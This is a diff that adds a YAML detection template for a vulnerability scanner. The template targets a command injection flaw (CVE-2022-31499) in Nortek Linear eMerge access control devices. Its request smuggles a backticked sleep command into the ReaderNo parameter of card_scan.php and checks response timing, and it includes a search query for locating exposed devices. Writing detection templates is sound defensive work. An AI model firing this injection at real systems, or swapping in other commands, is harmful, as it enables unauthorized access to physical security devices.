@@ -1,0 +1,17 @@
+id: poc-yaml-nortek-linear-emerge-command-injection
+info:
+  name: Nortek Linear eMerge 命令注入漏洞(CVE-2022-31499)
+  severity: critical
+  tags:
+  - CVE-2022-31499
+  - 操作系统命令注入
+  finger: linear emerge
+  fofa: title="Linear eMerge"
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /card_scan.php?No=123&ReaderNo=`sleep%20{{.t1}}`&CardFormatNo=123
+  expression: status_code == 200 && contains(body,"\"CardNo\":false") && contains(headers,"text/html")
+    && !contains(body,"<") && duration >= t1
+transport: http
